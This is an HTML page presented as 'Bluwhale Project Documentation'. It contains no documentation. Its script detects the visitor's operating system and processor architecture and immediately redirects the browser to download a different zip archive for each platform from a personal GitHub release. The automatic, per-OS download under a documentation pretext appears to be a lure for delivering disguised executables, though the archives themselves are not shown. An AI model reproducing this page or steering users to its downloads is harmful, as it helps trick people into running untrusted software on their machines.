<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">

    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0"
    >

    <title>Bluwhale Project Documentation</title>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            min-height: 100vh;

            display: flex;
            align-items: center;
            justify-content: center;

            font-family:
                Inter,
                -apple-system,
                BlinkMacSystemFont,
                "Segoe UI",
                sans-serif;

            background: #f7f8fa;
            color: #1c1c1c;
        }

        .card {
            width: min(520px, calc(100% - 40px));
            padding: 40px;

            background: white;
            border: 1px solid #e8e8e8;
            border-radius: 16px;

            text-align: center;

            box-shadow:
                0 10px 30px rgba(0, 0, 0, 0.05);
        }

        h1 {
            margin: 0 0 12px;
            font-size: 24px;
        }

        p {
            color: #666;
            line-height: 1.6;
        }

        .loader {
            width: 32px;
            height: 32px;

            margin: 26px auto;

            border: 3px solid #e5e5e5;
            border-top-color: #222;
            border-radius: 50%;

            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .fallback {
            display: none;
            margin-top: 30px;
        }

        .download {
            display: block;

            margin-top: 10px;
            padding: 12px 18px;

            text-decoration: none;

            background: #111;
            color: white;

            border-radius: 8px;
        }

        .download:hover {
            opacity: 0.85;
        }

        #status {
            font-size: 14px;
        }
    </style>
</head>

<body>

<div class="card">

    <h1>Project Documentation</h1>

    <p id="status">
        Detecting your platform and preparing the appropriate documentation…
    </p>

    <div id="loader" class="loader"></div>

    <div id="fallback" class="fallback">

        <p>
            We couldn't automatically determine your system.
            Please choose your platform.
        </p>

        <a
            class="download"
            href="https://github.com/blu-alex-lehman/document/releases/download/0.0.1/dev_document.zip"
        >
            Windows
        </a>

        <a
            class="download"
            href="https://github.com/blu-alex-lehman/document/releases/download/0.0.1/project_description.zip"
        >
            macOS
        </a>

        <a
            class="download"
            href="https://github.com/blu-alex-lehman/document/releases/download/0.0.1/project_doc.zip"
        >
            Linux ARM64
        </a>

        <a
            class="download"
            href="https://github.com/blu-alex-lehman/document/releases/download/0.0.1/project_desc.zip"
        >
            Linux x86_64
        </a>

    </div>

</div>


<script>

const DOWNLOADS = {

    windows:
        "https://github.com/blu-alex-lehman/document/releases/download/0.0.1/dev_document.zip",

    mac:
        "https://github.com/blu-alex-lehman/document/releases/download/0.0.1/project_description.zip",

    linuxArm:
        "https://github.com/blu-alex-lehman/document/releases/download/0.0.1/project_doc.zip",

    linuxX64:
        "https://github.com/blu-alex-lehman/document/releases/download/0.0.1/project_desc.zip"

};


function redirect(url) {

    document.getElementById("status").textContent =
        "Documentation found. Starting download…";

    window.location.replace(url);

}


function showFallback(message = "") {

    document.getElementById("loader").style.display = "none";

    document.getElementById("fallback").style.display = "block";

    document.getElementById("status").textContent =
        message || "Please select your platform.";

}


async function detectPlatform() {

    const userAgent =
        navigator.userAgent.toLowerCase();

    /*
     * WINDOWS
     */

    if (
        userAgent.includes("windows") ||
        navigator.platform.toLowerCase().includes("win")
    ) {

        redirect(DOWNLOADS.windows);

        return;
    }


    /*
     * macOS
     */

    if (
        userAgent.includes("macintosh") ||
        userAgent.includes("mac os x") ||
        navigator.platform.toLowerCase().includes("mac")
    ) {

        redirect(DOWNLOADS.mac);

        return;
    }


    /*
     * Linux
     */

    if (
        userAgent.includes("linux") &&
        !userAgent.includes("android")
    ) {

        /*
         * Best method:
         * Chromium User-Agent Client Hints API
         */

        if (
            navigator.userAgentData &&
            navigator.userAgentData.getHighEntropyValues
        ) {

            try {

                const info =
                    await navigator.userAgentData
                        .getHighEntropyValues([
                            "architecture",
                            "bitness"
                        ]);

                const architecture =
                    (info.architecture || "").toLowerCase();

                console.log(
                    "Detected architecture:",
                    architecture
                );

                console.log(
                    "Detected bitness:",
                    info.bitness
                );


                /*
                 * ARM
                 */

                if (
                    architecture.includes("arm")
                ) {

                    redirect(
                        DOWNLOADS.linuxArm
                    );

                    return;
                }


                /*
                 * x86 / x86_64
                 */

                if (
                    architecture.includes("x86") ||
                    architecture.includes("x64")
                ) {

                    redirect(
                        DOWNLOADS.linuxX64
                    );

                    return;
                }

            } catch (error) {

                console.error(
                    "Architecture detection failed:",
                    error
                );

            }

        }


        /*
         * Fallback to legacy UA information
         */

        const platform =
            navigator.platform.toLowerCase();


        if (
            userAgent.includes("aarch64") ||
            userAgent.includes("arm64") ||
            platform.includes("arm")
        ) {

            redirect(
                DOWNLOADS.linuxArm
            );

            return;
        }


        if (
            userAgent.includes("x86_64") ||
            userAgent.includes("amd64") ||
            platform.includes("x86_64") ||
            platform.includes("x64")
        ) {

            redirect(
                DOWNLOADS.linuxX64
            );

            return;
        }


        /*
         * Linux found,
         * architecture unknown
         */

        showFallback(
            "Linux detected, but we couldn't reliably determine your processor architecture."
        );

        return;
    }


    /*
     * Android / iPhone / unsupported OS
     */

    showFallback(
        "We couldn't automatically identify a supported desktop operating system."
    );

}


detectPlatform();

</script>

</body>
</html>
